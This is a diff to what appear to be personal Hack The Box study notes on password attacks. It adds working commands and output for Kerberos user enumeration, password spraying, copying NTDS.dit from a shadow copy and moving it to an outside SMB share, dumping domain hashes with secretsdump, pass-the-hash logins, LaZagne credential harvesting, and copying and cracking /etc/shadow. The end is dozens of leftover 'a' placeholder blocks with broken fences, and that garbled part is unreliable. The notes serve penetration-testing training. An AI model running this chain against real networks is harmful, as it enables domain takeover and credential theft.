@@ -931,6 +931,8 @@ jimstevenson
 jim.stevenson
 stevenson.jim
 ```
+# Useful Code
+[username-anarchy](https://github.com/urbanadventurer/username-anarchy)
 ```
 [/htb]$ ./username-anarchy -i /home/ltnbob/names.txt 
 
@@ -949,20 +951,271 @@ williamson
 williamson.b
 williamson.ben
 ```
+# Useful Code
+[kerbrute](https://github.com/ropnop/kerbrute)
 ```
-a
+[/htb]$ ./kerbrute_linux_amd64 userenum --dc 10.129.201.57 --domain inlanefreight.local names.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 04/25/25 - Ronnie Flathers @ropnop
+
+2025/04/25 09:17:10 >  Using KDC(s):
+2025/04/25 09:17:10 >   10.129.201.57:88
 ```
 ```
-a
+[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
 ```
 ```
-a
+*Evil-WinRM* PS C:\> net localgroup
+
+Aliases for \\DC01
+
+-------------------------------------------------------------------------------
+*Access Control Assistance Operators
+*Account Operators
+*Administrators
+*Allowed RODC Password Replication Group
+*Backup Operators
+*Cert Publishers
+*Certificate Service DCOM Access
+*Cryptographic Operators
+*Denied RODC Password Replication Group
+*Distributed COM Users
+*DnsAdmins
+*Event Log Readers
+*Guests
+*Hyper-V Administrators
+*IIS_IUSRS
+*Incoming Forest Trust Builders
+*Network Configuration Operators
+*Performance Log Users
+*Performance Monitor Users
+*Pre-Windows 2000 Compa
 ```
 ```
-a
+*Evil-WinRM* PS C:\> net user bwilliamson
+
+User name                    bwilliamson
+Full Name                    Ben Williamson
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            1/13/2022 12:48:58 PM
+Password expires             Never
+Password changeable          1/14/20
 ```
 ```
-a
+*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
+
+vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
+(C) Copyright 2001-2013 Microsoft Corp.
+
+Successfully created shadow copy for 'C:\'
+    Shadow Copy ID: {186d5979-2f2b-4afe-8101-9f1111e4cb1a}
+    Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCo
+```
+```
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
+
+        1 file(s) copied.
+```
+```
+*Evil-WinRM* PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\10.10.15.30\CompData 
+
+        1 file(s) moved.		
+```
+```
+[/htb]$ impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
+
+Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Target system bootKey: 0x62649a98dea282e3c3df04cc5fe4c130
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Searching for pekList, be patient
+[*] PEK # 0 found and decrypted: 086ab260718494c3a503c47d430a92a4
+[*] Reading and decrypting hashes from NTDS.dit 
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+DC01$:1000:aad3b435b51404eeaad3b435b51404ee:e6be3fd362edbaa873f50e384a02ee68:::
+krbtgt:502:a
+```
+```
+[/htb]$ netexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! -M ntdsutil
+```
+```
+[/htb]$ evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
 ```
 
+#### Credential Hunting in Windows
+
+```
+C:\Users\bob\Desktop> start LaZagne.exe all
+|====================================================================|
+|                                                                    |
+|                        The LaZagne Project                         |
+|                                                                    |
+|                          ! BANG BANG !                             |
+|                                                                    |
+|====================================================================|
+
+
+########## User: bob ##########
+
+------------------- Winscp passwords -----------------
+
+[+] Password found !!!
+URL: 10.129.202.51
+Login: admin
+Password: SteveisReallyC
+```
+
+```
+C:\> findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
+```
+
+#### Linux Authentication Process
+
+```
+[/htb]$ head -n 1 /etc/passwd
+
+root::0:0:root:/root:/bin/bash
+```
+```
+[/htb]$ su
+
+root@htb[/htb]#
+```
+```
+ID			Cryptographic Hash Algorithm
+1			MD5
+2a			Blowfish
+5			SHA-256
+6			SHA-512
+sha1		SHA1crypt
+y			Yescrypt
+gy			Gost-yescrypt
+7			Scrypt
+```
+```
+[/htb]$ sudo cat /etc/security/opasswd
+
+cry0l1t3:1000:2:$1$HjFAfYTG$qNDkF0zJ3v8ylCOrKB0kt0,$1$kcUjWZJX$E9uMSmiQeRh4pAAgzuvkq1
+```
+```
+mdmithu@htb[/htb]$ sudo cp /etc/passwd /tmp/passwd.bak 
+mdmithu@htb[/htb]$ sudo cp /etc/shadow /tmp/shadow.bak 
+mdmithu@htb[/htb]$ unshadow /tmp/passwd.bak /tmp/shadow.bak > /tmp/unshadowed.hashes```
+```
+```
+/htb]$ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.cracked
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+``````
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
+```
+a
+```
 
